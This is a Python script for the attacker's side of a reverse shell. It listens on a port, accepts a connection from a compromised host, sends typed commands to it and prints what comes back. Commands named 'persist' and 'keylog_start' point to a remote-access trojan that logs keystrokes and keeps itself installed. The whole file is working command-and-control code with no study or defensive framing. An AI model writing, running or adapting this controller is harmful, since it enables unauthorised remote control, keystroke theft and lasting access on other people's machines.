import socket

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Set socket options
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    server_address = ('192.168.1.6', 50005)
    sock.bind(server_address)
    sock.listen(5)
    
    print(f"[*] Listening on {server_address[0]}:{server_address[1]}")
    
    client_socket, client_address = sock.accept()
    print(f"[*] Accepted connection from {client_address[0]}:{client_address[1]}")
    
    while True:
        buffer = input(f"* Shell#{client_address[0]}~$: ").encode('utf-8')
        
        if buffer.strip() == b'q':
            break
        elif buffer.startswith(b'cd ') or buffer.strip() == b'keylog_start':
            continue
        elif buffer.strip() == b'persist':
            client_socket.send(buffer)
            response = client_socket.recv(18384)
            print(response.decode('utf-8'), end='')
        else:
            client_socket.send(buffer)
            response = client_socket.recv(18384)
            print(response.decode('utf-8'), end='')
    
    client_socket.close()
    sock.close()

if __name__ == "__main__":
    main()
